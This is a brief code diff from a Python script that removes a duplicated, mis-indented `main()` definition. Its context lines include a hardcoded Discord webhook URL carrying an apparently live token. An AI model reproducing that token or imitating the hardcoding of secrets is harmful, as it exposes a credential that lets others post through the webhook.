@@ -216,10 +216,6 @@ IMPLIED_SKILLS = {
 def main():
     artifact = load_benchmark()
     aliases, categories = load_taxonomy()
-
-    def main():
-    artifact = load_benchmark()
-    aliases, categories = load_taxonomy()
     
     # Add this line right here:
     WEBHOOK_URL = "https://discord.com/api/webhooks/1571844996813029529/3Dg7Uo7yeeuprCy8euTN-Ger8nFNbkYjnDQv_vQfPwP8y-CQcUybRR57HmmBYs2KyWh9" 
